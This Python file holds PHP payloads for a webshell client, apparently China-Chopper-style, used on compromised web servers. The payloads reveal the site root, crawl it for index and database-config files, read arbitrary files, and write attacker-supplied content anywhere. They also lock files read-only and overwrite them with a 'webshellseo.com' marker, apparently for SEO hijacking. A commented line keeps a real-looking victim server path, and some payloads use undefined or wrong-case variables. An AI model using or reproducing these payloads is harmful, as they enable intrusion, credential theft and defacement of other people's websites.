#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
#获取网站路径
php_www_path="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
echo $_SERVER['DOCUMENT_ROOT']."/";   //获取程序根目录
echo("|<-");
die();
?>
"""

#遍历路径
PHP_bl_path="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
//function ChickC($str)  //判断编码格式
//{
//	$array = array('ASCII','GBK','UTF-8');
//	foreach ($array as $value)
//	{
//	  if ($str === mb_convert_encoding(mb_convert_encoding($str, "UTF-32", $value), $value, "UTF-32"))
//	   return $value;
//	}
//	return false;
//}
//遍历文件
function for_file($path)
{
	try
	{
		$d =@dir("$path");
		while (false !== ($entry = $d->read()))
		{
			if($entry == "." || $entry == "..")
				continue;
			$file=$d->path."/" .$entry;
			if(@is_dir($file))
			{
				for_file($file);
			}
			else
			{
				$path_data=base64_decode($_POST["z1"]);  //路径
				//$path_data="index.php|forum.php|conn.php|CONN.php|home.php|common.inc.php|global.php";  //路径
				//index.asp|Index.asp|conn.asp|CONN.asp|index.aspx|index.htm|Index.htm|index.html|Index.html|index.php|forum.php|conn.php|CONN.php|Default.htm|Default.html|Default.asp|home.php|index.jsp|common.inc.php|global.asa|global.php
				if(@ereg($path_data,$file))
				{
				    echo $file."$";
					//echo $file."#".ChickC($file)."$";
					//file_add($file);
				}
			}
		}
		$d->close();
		return 1;
	}
	catch(Exception $e)
	{
	//echo $e."遍历异常"."<br>";
	return 0;
	}
}
$root_web=$_SERVER['DOCUMENT_ROOT'];   //获取程序根目录
//echo $root_web;
for_file($root_web);  //遍历文件
echo("|<-");
die();
?>
"""
#读取文件
php_open_file="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
//$F=get_magic_quotes_gpc()?stripslashes("/home/azch4xbvjz/domains/cincon.cn/public_html/home/azch4xbvjz/domains/cincon.cn/public_html/special/index.php"):"/home/azch4xbvjz/domains/cincon.cn/public_html/home/azch4xbvjz/domains/cincon.cn/public_html/special/index.php";
//echo $f;
if (!$fp=@file_get_contents($F))
{
	echo("no");
}else{
	echo $fp;
}
echo("|<-");
die();
?>
"""
#写入文件
write_file="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$f=base64_decode($_POST["z1"]);  //路径
//$f="D:/wamp/www/1.txt";
$c=$_POST["z2"];  //内容
//$c="3C3F7068700D0A24463D22433A2F77616D702F7777772F2F696E6465782E706870223B0D0A6563686F2866696C655F657869737473282446293F63686D6F642824462C30363636293F2231223A2230223A223022293B0D0A64696528293B0D0A3F3E";  //内容
//$c=str_replace("%","",$c);  //替换
//$c=str_replace(",","",$c);  //替换
$c=str_replace("\r","",$c);  //替换
$c=str_replace("\n","",$c);  //替换
//echo $c;
$buf="";  //替换
for($i=0;$i<strlen($c);$i+=2)
$buf.=urldecode("%".substr($c,$i,2));//还原 URL 编码字符串
@chmod($F,0777);   //读写权限
echo(@fwrite(fopen($f,"w"),$buf)?"ok":"no");
echo("|<-");
die();
?>
"""

#锁WIN32文件
s_win_file="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
//@chmod($F,0444)?"ok":"no";
echo @chmod($F,0444)?"ok":"no";
echo("|<-");
die();
?>
"""

#锁LINUX文件
s_LINUX_file="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
$buf="webshellseo.com";  //替换
@chmod($F,0444);
echo(@fwrite(fopen($f,"w"),$buf)?"ok":"no");
echo("|<-");
die();
?>
"""
